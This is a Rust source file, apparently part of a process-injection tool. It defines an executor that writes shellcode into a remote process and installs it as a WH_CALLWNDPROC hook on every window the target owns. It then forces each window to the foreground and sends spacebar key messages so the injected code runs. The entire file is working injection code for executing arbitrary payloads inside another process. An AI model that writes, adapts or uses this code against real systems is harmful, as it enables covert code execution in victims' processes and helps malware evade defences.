use std::{thread::sleep};

use windows::{Win32::{Foundation::{WPARAM}, UI::{Input::KeyboardAndMouse::VK_SPACE, WindowsAndMessaging::{WH_CALLWNDPROC, WM_KEYDOWN, WM_KEYUP}}}};

use crate::wrappers::{
    RemoteAllocator as _,
    HandleWrapper as _,
    RemoteProcess,
    RemoteModule,
    Hook
};
use super::ExecutionMethod;

pub(super) struct SetWindowsHookExExecutor;

impl ExecutionMethod for SetWindowsHookExExecutor {
    fn execute(
        remote_process: &RemoteProcess,
        shellcode_to_exec: &Vec<u8>,
    ) -> Result<(), Box<dyn std::error::Error>> {
        let shellcode_mem = remote_process.write_shellcode(shellcode_to_exec)?;

        let windows = remote_process.get_windows()?;
        println!("Found {} windows in target process", windows.len());

        let remote_hook: Hook = unsafe { std::mem::transmute(shellcode_mem) };
        let module = RemoteModule::new("user32.dll")?;

        for window in &windows {
            let hook = window.set_windows_hook_ex(
                WH_CALLWNDPROC,
                Some(remote_hook),
                Some(&module),
            );
            if hook.is_err() {
                println!("Failed to install hook on window {:?} (thread id: {}): {:?}", window.handle(), window.tid(), hook.err());
                continue;
            }

            println!("Installed hook on window {:?} (thread id: {})", window.handle(), window.tid());
            let space_key = WPARAM(VK_SPACE.0 as usize);
            window.set_foreground()?;
            window.send_msg(WM_KEYDOWN, Some(space_key), None);
            sleep(std::time::Duration::from_millis(10));
            window.send_msg(WM_KEYUP, Some(space_key), None);
        }

        Ok(())
    }
}

// this method had different shcode different by last instruction
// initial tests OK, leaving this here if something fucks up in the future
//         ; xor rax, rax // return 0 from a hooked function